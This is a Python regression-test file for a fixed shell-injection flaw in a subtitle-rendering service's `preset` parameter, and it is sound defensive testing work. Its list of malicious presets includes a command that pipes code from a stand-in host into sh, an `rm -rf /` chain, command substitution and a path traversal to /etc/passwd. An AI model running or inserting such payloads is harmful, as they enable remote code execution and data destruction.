"""Regression tests for the shell-injection RCE via `preset`.

Before the fix, `core/subtitles.py` built the .ass file name from the raw
`preset` value and interpolated it into an ffmpeg command string executed with
`subprocess.run(..., shell=True)`. A payload such as
`preset="$(curl x.yz|sh)"` (fits in the old 50-char frontend limit, no slash)
would be expanded by the shell inside the processing container.

The fix has two independent layers, each covered here:
1. `ProcessVideoRequest.preset` is an allowlist (422 on anything else).
2. `create_subtitles_with_ffmpeg` never uses a shell (argument list,
   `shell=False`) and never puts raw `preset` text into the file name.
"""

import os
import tempfile
from unittest.mock import patch

import pytest
from pydantic import ValidationError

from core.schemas import ProcessVideoRequest
from core.subtitles import create_subtitles_with_ffmpeg

MALICIOUS_PRESETS = [
    "$(curl x.yz|sh)",
    "`id`",
    "HORMOZI; rm -rf /",
    "HORMOZI && touch pwned",
    "../../etc/passwd",
    "hormozi",  # case variants are not part of the wire contract
    "",
]

# Presets the UI sends today (create-project-client.tsx "Estilo da Legenda"
# + default "NONE" from process-video-payload.service.ts).
UI_PRESETS = [
    "HORMOZI",
    "POPPING_GREEN",
    "GAMER",
    "LOUD",
    "NEON",
    "TRUE_CRIME",
    "MINIMAL",
    "CORPORATE",
    "VLOG",
    "ASMR",
    "NONE",
]

TRANSCRIPT = [
    {"start": 10.0, "end": 10.5, "word": "hello"},
    {"start": 10.6, "end": 11.0, "word": "world"},
]


class TestProcessVideoRequestPresetAllowlist:
    @pytest.mark.parametrize("preset", MALICIOUS_PRESETS)
    def test_rejects_preset_outside_allowlist(self, preset):
        with pytest.raises(ValidationError):
            ProcessVideoRequest(s3_key="uploads/x.mp4", preset=preset)

    @pytest.mark.parametrize("preset", UI_PRESETS)
    def test_accepts_every_preset_the_ui_sends(self, preset):
        req = ProcessVideoRequest(s3_key="uploads/x.mp4", preset=preset)
        assert req.preset == preset

    def test_default_preset_is_still_hormozi(self):
        assert ProcessVideoRequest(s3_key="uploads/x.mp4").preset == "HORMOZI"

    def test_allowlist_covers_every_ui_preset(self):
        from core.schemas import SUBTITLE_PRESETS

        assert set(UI_PRESETS) <= set(SUBTITLE_PRESETS)


class TestCreateSubtitlesNeverUsesShell:
    @pytest.mark.parametrize("preset", MALICIOUS_PRESETS + ["NEON"])
    def test_ffmpeg_is_called_with_arg_list_and_no_shell(self, preset):
        with tempfile.TemporaryDirectory() as tmpdir, patch(
            "core.subtitles.subprocess.run"
        ) as mock_run:
            output_video = os.path.join(tmpdir, "out.mp4")
            create_subtitles_with_ffmpeg(
                transcript_segments=TRANSCRIPT,
                clip_start=10.0,
                clip_end=11.0,
                clip_video_path=os.path.join(tmpdir, "clip.mp4"),
                output_path=output_video,
                preset=preset,
            )

            mock_run.assert_called_once()
            args, kwargs = mock_run.call_args
            cmd = args[0]
            assert isinstance(cmd, list), "ffmpeg must be invoked with an argument list"
            assert kwargs.get("shell", False) is False
            assert cmd[0] == "ffmpeg"
            assert cmd[-1] == output_video

            # The generated .ass file stays inside the output directory and its
            # name contains no shell metacharacters / path separators.
            vf_arg = cmd[cmd.index("-vf") + 1]
            assert vf_arg.startswith("ass=")
            subtitle_path = vf_arg[len("ass="):]
            assert os.path.dirname(subtitle_path) == tmpdir
            name = os.path.basename(subtitle_path)
            for ch in "$`;|&()<>'\" /\\":
                assert ch not in name
            assert os.path.exists(subtitle_path)
